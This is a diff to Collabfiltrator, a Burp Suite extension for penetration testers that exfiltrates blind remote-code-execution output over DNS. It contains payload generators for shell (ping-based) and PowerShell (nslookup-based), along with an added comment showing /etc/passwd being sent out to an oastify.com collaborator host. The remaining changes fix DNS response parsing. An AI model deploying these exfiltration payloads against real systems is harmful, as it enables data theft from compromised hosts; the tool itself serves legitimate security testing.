@@ -6,6 +6,7 @@ from java.awt.datatransfer import Clipboard, StringSelection
 from javax import swing
 from thread import start_new_thread
 import sys, time, threading, base64
+import re
 try:
     from exceptions_fix import FixBurpExceptions
 except ImportError:
@@ -86,7 +87,10 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         self.burpCollaboratorDomainTxt.setEditable(False)
         self.burpCollaboratorDomainTxt.setBackground(None)
         self.burpCollaboratorDomainTxt.setBorder(None)
-        self.t1r1.add(swing.JLabel("<html><center><h2>Collabfiltrator</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>"))
+        titleLabel = swing.JLabel(
+            "<html><center><h2>Collabfiltrator</h2>Exfiltrate blind remote code execution output over DNS via Burp Collaborator.</center></html>")
+        titleLabel.putClientProperty("html.disable", None)
+        self.t1r1.add(titleLabel)
         self.t1r2.add(swing.JLabel("Platform"))
         self.t1r2.add(self.osComboBox)
         self.t1r2.add(swing.JLabel("Command"))
@@ -136,14 +140,16 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
     def createShPingBase64Payload(self, linuxCommand):
         global exfilFormat
         exfilFormat = "hex"
-        shCommand = "i=0;" + linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&i=$((i+1));echo;done'''
+        # i=0;cat /etc/passwd|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.gn7ytz99i5bolmnrgue5wtslkcq8ex.oastify.com&i=$((i+1));echo;done
+
+        shCommand = "i=0;" +linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&i=$((i+1));echo;done'''
         return "echo " + self._helpers.base64Encode(shCommand) + "|base64 -d|sh"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
         global exfilFormat
         exfilFormat = "base64"
-        powershellCommand = '''$s=50;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        powershellCommand = '''$s=50;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
 
     def killDanglingThreads(self):
@@ -200,6 +206,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         DNSrecordDict = dict()#since data comes in out of order we have to line up each request with it's timestamp
         #recordType = "A" #01
         complete = False
+        DNSQueryTypeA = 1
         #recordType = "AAAA" #1C or int(28)
         #recordType = "MX" #00 ?
         sameCounter = 0 #if this gets to 5, it means our data chunks coming in have been the same for 5 iterations and no new chunks are coming in so we can end the while loop.
@@ -220,11 +227,28 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
             for i in range(0, len(check)):
                 dnsQuery = self._helpers.base64Decode(check[i].getProperty('raw_query'))
-                preambleOffset = int(dnsQuery[12]) #Offset in dns query where preamble starts (0000,0001,0002,0003....)
-                base64EncodedDataChunkOffset = int(dnsQuery[17]) #Offset in dns query where base64 encoded output data starts
-                base64EncodedDataChunk = ''.join(chr (x) for x in dnsQuery[18:(18+base64EncodedDataChunkOffset)]) #Base64 encoded output data chunk
-                preambleNumber = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])
-                DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data
+                dnsQuery = bytearray(dnsQuery)
+                # print("dnsQuery", dnsQuery)
+                dnsRecrodTypeOffset = dnsQuery[12:].find("\x00") + 1 + 1
+                dnsRecrodType = dnsQuery[dnsRecrodTypeOffset + 12]
+                # print("dnsRecrodTypeOffset", dnsRecrodTypeOffset, "dnsRecrodType", dnsRecrodType)
+                if dnsRecrodType == DNSQueryTypeA:
+                    # print("dnsQuery Type A", dnsQuery)
+                    preambleOffset = dnsQuery[12] #Offset in dns query where preamble starts (0000,0001,0002,0003....)
+                    base64EncodedDataChunkOffset = dnsQuery[17] #Offset in dns query where base64 encoded output data starts
+                    preambleNumber = ''.join([chr (x) for x in dnsQuery[13:(13+preambleOffset)]])
+                    if not preambleNumber.isdigit():
+                        print("[Wrong format] preambleNumber", preambleNumber)
+                        continue
+                    base64EncodedDataChunk = ''.join([chr (x) for x in dnsQuery[18:(18+base64EncodedDataChunkOffset)]]) #Base64 encoded output data chunk
+                    if exfilFormat == "base64":
+                        if not re.match("^[a-z0-9]+$", base64EncodedDataChunk):
+                            print("[Correct] preambleNumber", preambleNumber, "base64EncodedDataChunk", base64EncodedDataChunk)
+                            DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data
+                        else:
+                            print("[Wrong format] preambleNumber", preambleNumber, "base64EncodedDataChunk", base64EncodedDataChunk)
+                    else:
+                        DNSrecordDict[preambleNumber] = base64EncodedDataChunk #line up preamble with base64EncodedDataChunk containing data
 
             keys = DNSrecordDict.keys()
 
